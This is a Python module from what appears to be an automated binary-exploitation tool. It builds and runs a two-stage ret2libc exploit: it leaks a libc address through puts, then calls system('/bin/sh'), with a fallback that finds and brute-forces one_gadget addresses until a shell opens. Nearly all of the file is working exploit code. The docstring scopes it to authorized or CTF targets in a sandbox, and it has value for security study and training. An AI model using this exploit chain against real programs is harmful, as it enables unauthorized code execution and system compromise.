"""ret2libc-with-leak, verified by getting a shell in the sandbox.

Stage 1 leaks a libc address (puts@GOT via puts@PLT) and returns to main; stage 2 uses the
computed libc base to call system('/bin/sh'). Runs inside the pwntools sandbox image
('binoracle-pwn') with ASLR disabled (setarch -R) so the two runs share a base. For
AUTHORIZED / CTF targets. Build the image once with: make pwn-image."""
from __future__ import annotations

from ._sandbox import run_driver

_DRIVER = r'''
import sys, subprocess, struct
from pwn import ELF, u64, ROP, context
context.log_level = "error"
p64 = lambda x: struct.pack("<Q", x)
name = sys.argv[1]
elf = ELF(name, checksec=False)
rop = ROP(elf)
g = rop.find_gadget(["pop rdi", "ret"]) or rop.find_gadget(["pop rdi"])
if not g or "puts" not in elf.plt:
    print("NOT_APPLICABLE (no pop rdi / no puts)"); sys.exit(1)
pr = g.address; ret = rop.find_gadget(["ret"]).address
puts_plt = elf.plt["puts"]; puts_got = elf.got["puts"]
reenter = elf.symbols.get("main") or elf.symbols.get("vuln")
OFF_CANDS = [88, 72, 80, 96, 104, 64, 120, 112, 128, 136, 56, 40]
READSZ = 4096
def run(inp):
    r = subprocess.run(["setarch", "-R", "./" + name], input=inp, capture_output=True, timeout=10)
    return r.stdout + r.stderr
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6", checksec=False)
puts_off = libc.symbols["puts"]; system_off = libc.symbols["system"]
binsh_off = next(libc.search(b"/bin/sh\x00"))
MARK = b"BINORACLE_LIBC_PWNED"
OG_ONLY = len(sys.argv) > 2 and sys.argv[2] == "og_only"   # force the aggressive one_gadget path

def _one_gadgets(lc):
    # Candidate one_gadget offsets (libc-relative): a single libc address that spawns a shell.
    # Prefer the external `one_gadget` tool, but fall back to a PURE-PYTHON finder (capstone) so
    # this works with NO external dependency: scan .text for `lea rdi, [rip -> "/bin/sh"]` -- the
    # entry points that set rdi to "/bin/sh" just before an execve, i.e. real one_gadgets. Execution
    # then filters which actually fire (their register constraints are satisfied at runtime).
    try:
        import subprocess as _sp
        raw = _sp.run(["one_gadget", "--raw", lc.path], capture_output=True, text=True, timeout=30).stdout
        got = [int(x, 0) for x in raw.split()]
        if got:
            return got
    except Exception:
        pass
    # Pure-python one_gadget finder (no external tool): a real one_gadget is an address where, on
    # jumping to it, execve("/bin/sh", ...) fires. We locate the execve REACH points -- a `call`/`jmp`
    # to libc's execve, or a `mov eax,0x3b; syscall` -- and, scanning a backward window, find where
    # rdi is loaded with &"/bin/sh" (`lea rdi,[rip+binsh]`); the gadget candidate is that lea's
    # address (the start of the execve setup). Execution then filters which actually fire (their
    # rsi/rdx/stack constraints). This finds the genuine entry points, not a bare lea mid-function.
    out = []
    try:
        from capstone import Cs, CS_ARCH_X86, CS_MODE_64
        binsh_va = next(lc.search(b"/bin/sh\x00"))
        execve_va = None
        try:
            execve_va = lc.symbols.get("execve") or lc.symbols.get("__execve")
        except Exception:
            execve_va = None
        sec = lc.get_section_by_name(".text"); data = sec.data(); va = sec.header.sh_addr
        md = Cs(CS_ARCH_X86, CS_MODE_64)
        insns = list(md.disasm(data, va))
        # index of each instruction + a quick "is this a lea rdi,binsh" test
        lea_rdi_binsh = {}
        for i, ins in enumerate(insns):
            if ins.mnemonic == "lea" and ins.op_str.startswith("rdi,") and "rip" in ins.op_str:
                try:
                    disp = int(ins.op_str.split("[rip")[1].split("]")[0].replace(" ", "").replace("+", "", 1), 16)
                except Exception:
                    continue
                if ins.address + ins.size + disp == binsh_va:
                    lea_rdi_binsh[i] = ins.address
        # execve reach points: a direct call/jmp to execve, or an eax=0x3b syscall
        reach = []
        for i, ins in enumerate(insns):
            if ins.mnemonic in ("call", "jmp") and execve_va is not None and ins.op_str.strip().startswith("0x"):
                try:
                    if int(ins.op_str, 16) == execve_va:
                        reach.append(i)
                except ValueError:
                    pass
            elif ins.mnemonic == "syscall":
                for j in range(max(0, i - 6), i):      # recent `mov eax, 0x3b`
                    pj = insns[j]
                    if pj.mnemonic == "mov" and pj.op_str.replace(" ", "") in ("eax,0x3b", "rax,0x3b"):
                        reach.append(i); break
        seen = set()
        for ri in reach:
            # nearest preceding lea rdi,binsh within a 48-instruction window
            for k in range(ri, max(-1, ri - 48), -1):
                if k in lea_rdi_binsh:
                    a = lea_rdi_binsh[k]
                    if a not in seen:
                        seen.add(a)
                        out.append(a)
                    break
            if len(out) >= 12:
                break
        # last resort: the bare lea sites (older libc one_gadgets sometimes sit right on them)
        if not out:
            out = sorted(set(lea_rdi_binsh.values()))[:8]
    except Exception:
        pass
    return out

OGS = _one_gadgets(libc)     # computed ONCE (not per-offset): constant for this libc
for OFF in OFF_CANDS:
    for a1 in (1, 0):
        s1 = b"A" * OFF + p64(ret) * a1 + p64(pr) + p64(puts_got) + p64(puts_plt) + p64(reenter)
        out = run(s1)
        parts = out.split(b"data: ") if b"data: " in out else [b"", out]
        leak = 0
        tail = parts[1] if len(parts) >= 2 else out
        for st in range(0, max(1, len(tail) - 5)):
            seg = tail[st:st + 6]
            if len(seg) == 6:
                v = u64(seg.ljust(8, b"\x00"))
                if 0x7f0000000000 < v < 0x800000000000:
                    leak = v; break
        if not leak:
            continue
        base = leak - puts_off
        system = base + system_off; binsh = base + binsh_off
        if not OG_ONLY:
            for a2 in (1, 0):
                chain = b"A" * OFF + p64(ret) * a2 + p64(pr) + p64(binsh) + p64(system)
                inp = chain.ljust(READSZ, b"A") + b"\n echo " + MARK + b"\n"
                if MARK in run(inp):
                    print("VERIFIED off=%d leak=%#x base=%#x system=%#x" % (OFF, leak, base, system))
                    sys.exit(0)
        # AGGRESSIVE one_gadget fallback: a one_gadget is a single libc address that spawns a shell,
        # but modern glibc gadgets carry stack constraints (e.g. [rsp+0x50]==NULL, or r1x==NULL). We
        # do not parse the constraints; instead we SWEEP the two things that satisfy most of them for
        # free: (1) the stack alignment (0..5 leading `ret`s shift rsp so a constrained slot lands on
        # already-zero stack), and (2) a run of NULL qwords placed right after the gadget (so
        # [rsp+N]==NULL holds for the common offsets). The first combination that pops a shell wins.
        for og in OGS:
            for pad in range(0, 6):
                for nulls in (0, 1, 2, 3, 5, 8):
                    chain = b"A" * OFF + p64(ret) * pad + p64(base + og) + p64(0) * nulls
                    inp = chain.ljust(READSZ, b"A") + b"\n echo " + MARK + b"\n"
                    if MARK in run(inp):
                        print("VERIFIED off=%d one_gadget=%#x base=%#x pad=%d nulls=%d"
                              % (OFF, base + og, base, pad, nulls))
                        sys.exit(0)
print("NOT_VERIFIED")
sys.exit(1)
'''


def autolibc(binary: str, run: bool = True, og_only: bool = False) -> dict:
    """ret2libc con leak verificado por ejecucion. Con og_only=True fuerza la via agresiva de
    one_gadget (salta el system() y solo prueba gadgets magicos con barrido de alineacion/NULLs),
    util para demostrar que un one_gadget basta por si solo."""
    args = ["og_only"] if og_only else None
    res = run_driver(binary, _DRIVER, ".binoracle_libc.py", args=args)
    if not res.get("ok"):
        return res
    eng = res.get("engine", "sandbox")
    og = "one_gadget" in (res.get("detail") or "")
    res["note"] = (f"ret2libc con leak: shell verificada por ejecucion ({eng})"
                   if res.get("verified") and not og
                   else f"one_gadget (gadget magico, leak + barrido de constraints): shell verificada "
                        f"por ejecucion ({eng})" if res.get("verified")
                   else f"ret2libc/one_gadget: no verificado ({eng}) (sin leak/gadget aplicable o timing)")
    return res


def render_libc(r: dict) -> str:
    out = ["## Auto ret2libc (leak + system, verificado)\n"]
    if not r.get("ok"):
        return "\n".join(out + ["No disponible: " + r.get("note", "")])
    out.append(f"- shell verificada en sandbox: **{'SI' if r.get('verified') else 'no'}**")
    if r.get("detail"):
        out.append(f"- {r['detail']}")
    out.append(f"- {r.get('note','')}")
    if r.get("output"):
        out.append("\n### salida\n```\n" + r["output"].strip() + "\n```")
    return "\n".join(out)
